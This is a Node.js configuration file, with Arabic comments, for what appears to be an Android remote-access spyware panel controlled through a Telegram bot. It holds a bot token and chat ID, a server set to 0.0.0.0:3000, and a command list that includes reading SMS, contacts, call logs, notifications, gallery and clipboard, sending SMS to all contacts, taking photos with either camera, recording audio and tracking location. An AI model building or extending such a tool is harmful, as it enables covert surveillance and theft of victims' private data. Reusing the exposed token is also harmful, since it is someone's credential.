module.exports = {
    // 🔑 إعدادات التلجرام - ستضعها أنت
    TELEGRAM: {
        TOKEN: "8273593857:AAGNyv_BOdm6D-w2Z16uNBDht1jXiyn_J5o",
        CHAT_ID: "7604667042"
    },
    
    // 🌐 إعدادات السيرفر
    SERVER: {
        PORT: 3000,
        HOST: "0.0.0.0"
    },
    
    // 🔒 الإعدادات الأمنية
    SECURITY: {
        ALLOWED_COMMANDS: [
            'flashlight', 'wallpaper', 'device_info', 'vibrate', 
            'toast', 'play_sound', 'get_clipboard', 'get_sms',
            'send_sms', 'send_sms_to_all', 'get_contacts',
            'camera_front', 'camera_back', 'record_audio',
            'get_call_logs', 'get_notifications', 'get_location',
            'open_url', 'get_gallery', 'send_notification'
        ]
    }
};
